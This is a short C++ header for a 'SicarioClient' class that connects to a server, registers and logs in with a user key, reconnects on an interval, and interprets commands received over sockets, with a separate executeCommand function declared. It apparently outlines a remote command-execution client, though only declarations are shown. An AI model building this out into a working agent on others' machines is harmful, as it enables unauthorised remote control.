#include <string>
#include <cstring>
#include <math.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <queue>
#include <cstdio>
#include <sys/time.h>
#include "platform.h"

class SicarioClient {
    public:
        SicarioClient(std::string serverAddress, short port);
        ~SicarioClient();

        void reconnect();
        void disconnect();

        void sendPacket(std::string data);
        std::string receivePacket();
        void sendData(std::string data);
        std::string receiveData();

        std::string registerUser();
        void loginUser(std::string userKey);
        std::string interpretCommand(std::string command);

        std::string userKey;
        unsigned int connInterval;
    private:
        struct sockaddr_in connAddress;
        int conn=0;
};

std::string executeCommand(std::string cmd);
